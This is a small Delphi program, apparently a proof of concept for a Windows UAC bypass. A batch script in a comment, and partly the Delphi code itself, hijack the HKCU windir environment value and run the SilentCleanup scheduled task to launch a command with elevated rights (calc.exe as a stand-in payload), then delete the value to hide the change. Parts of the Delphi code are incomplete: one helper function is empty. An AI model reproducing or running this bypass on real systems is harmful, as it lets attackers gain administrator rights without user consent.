program QuietShower_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
echo "ShedTaskUAC.bat"
@echo off
timeout /t 3 >nul
reg add "HKCU\Environment" /v "windir" /d "cmd /c start calc.exe&REM " >nul
timeout /t 5 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F
timeout /t 2 >nul

}

uses
  SysUtils,
  windows,
  registry;

function sr(hivepath,valueitem,param : string): Boolean;
var
  reg: tregistry;
begin
  reg := tregistry.create;
  if reg.OpenKey(hivepath, False) then
  begin
    reg.WriteString(valueitem, param);
    reg.CloseKey;
    reg.Free;
  end;
end;

{
path := 'D:\Qport\trunk\Qport\';
  cmd := 'C:\Windows\System32\cmd.exe';
  //debug
  input := '/C' + SVN_PATH + ' help > C:\users\PhilippKober\UNIQUE_NAME_BLUB.txt';

  CreateOk := CreateProcess(PChar(cmd), PChar(input), nil, nil, false, CREATE_NEW_PROCESS_GROUP + NORMAL_PRIORITY_CLASS, nil,
     Pchar(path), StartInfo, ProcInfo);
  if CreateOk then
    // may or may not be needed. Usually wait for child processes
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
}


function se(cmd,params: string): Boolean;
begin

end;


begin
var
  cmd, param : string;



  try
  //set registry & sleep 5
    sr('HKCU\Environment','windir','cmd /c start calc.exe&REM ');
    sleep(5000);

  //run sched to proc
    cmd := 'cmd.exe';
    param := '/C schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul';
    se(cmd,param);

  //
    sleep(5000);
    //
    cmd := 'cmd.exe';
    param := '/C reg delete "HKCU\Environment" /v "windir" /F >nul';
    se(cmd,param);

    sleep(5000);
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
